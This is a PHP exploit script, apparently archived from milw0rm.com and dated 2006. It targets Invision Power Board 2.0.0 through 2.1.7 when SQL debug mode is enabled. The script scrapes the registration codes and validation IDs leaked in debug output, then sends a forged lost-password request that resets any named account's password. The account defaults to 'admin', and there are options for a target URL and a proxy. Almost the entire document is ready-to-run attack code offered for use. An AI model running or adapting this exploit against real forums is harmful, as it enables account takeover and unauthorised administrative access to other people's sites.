<html><head><title>Invision Power Board <= 2.1.7 (Debug) Remote Password Change Exploit</title></head><pre>&lt;?php
/*

 Debug Mode password change vulnerability
 Affects Invision Power Borard 2.0.0 to 2.1.7
 by Rapigator
 
 This works if:

 &quot;Debug Level&quot; is set to 3
 or
 Enable SQL Debug Mode is turned on
 
 In General Configuration of the forum software.

*/

// The forum's address up to and including 'index.php'
$site = &quot;http://localhost/forums/index.php&quot;;

// An existing user's login name
$name = &quot;admin&quot;;

// The new password(3-32 characters)
$pass = &quot;1234&quot;;

// You can use a proxy...
// $proxy = &quot;1.2.3.4:8080&quot;;



// -----------------------------
$site .= &quot;?&quot;;
$suffix = &quot;&quot;;
$name = urlencode($name);
$pass = urlencode($pass);
$curl = curl_init($site.'act=Reg&amp;CODE=10');
curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_TIMEOUT, 10);
$page = curl_exec($curl);
curl_close($curl);
if (preg_match('/&lt;span class=\'green\'&gt;INSERT&lt;\/span&gt; INTO &lt;span class=\'purple\'&gt;([\\w]*?)_reg_antispam&lt;\/span&gt; \\(regid,regcode,ip_address,ctime\\) VALUES\\(\'([\\w]{32}?)\',([\\d]*?),/', $page, $regs)) {
	$prefix = $regs[1];
	$regid = $regs[2];
	$regcode = $regs[3];
} else {
	$suffix = &quot;&amp;debug=1&quot;;
	$curl = curl_init($site.'act=Reg&amp;CODE=10'.$suffix);
	curl_setopt($curl, CURLOPT_PROXY, $proxy);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_TIMEOUT, 10);
	$page = curl_exec($curl);
	curl_close($curl);
	if (preg_match('/INSERT INTO ([\\w]*?)_reg_antispam \\(regid,regcode,ip_address,ctime\\) VALUES\\(\'([\\w]{32}?)\',([\\d]*?),/', $page, $regs)) {
		$prefix = $regs[1];
		$regid = $regs[2];
		$regcode = $regs[3];
	}
}
if (!isset($regid) || !isset($regcode)) {
	echo &quot;Error: Probably not vulnerable, or no forum found&quot;;
	exit;
}

$curl = curl_init($site.$suffix);
curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS, &quot;act=Reg&amp;CODE=11&amp;member_name={$name}&amp;regid={$regid}&amp;reg_code={$regcode}&quot;);
curl_setopt($curl, CURLOPT_TIMEOUT, 10);
$page = curl_exec($curl);
curl_close($curl);
if (preg_match('/&lt;span class=\'green\'&gt;INSERT&lt;\/span&gt; INTO &lt;span class=\'purple\'&gt;'.$prefix.'_validating&lt;\/span&gt; \\(vid,member_id,real_group,temp_group,entry_date,coppa_user,lost_pass,ip_address\\) VALUES\\(\'([\\w]{32}?)\',([\\d]{1,32}?),/', $page, $regs)) {
	change_pass($regcode,$regid,$regs[1],$regs[2]);
}
if (preg_match('/INSERT INTO '.$prefix.'_validating \\(vid,member_id,real_group,temp_group,entry_date,coppa_user,lost_pass,ip_address\\) VALUES\\(\'([\\w]{32}?)\',([\\d]{1,32}?),/', $page, $regs)) {
	change_pass($regcode,$regid,$regs[1],$regs[2]);
}

function change_pass($regcode,$regid,$vid,$userid) {
	global $site, $proxy, $name, $pass;
	$curl = curl_init($site.$suffix);
	curl_setopt($curl, CURLOPT_PROXY, $proxy);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, &quot;act=Reg&amp;CODE=03&amp;type=lostpass&amp;uid={$userid}&amp;aid={$vid}&amp;regid={$regid}&amp;reg_code={$regcode}&amp;pass1={$pass}&amp;pass2={$pass}&quot;);
	curl_setopt($curl, CURLOPT_TIMEOUT, 10);
	$page = curl_exec($curl);
	curl_close($curl);
	echo &quot;Password Changed!&quot;;
	exit;
}
?&gt;

# milw0rm.com [2006-11-01]</pre></html>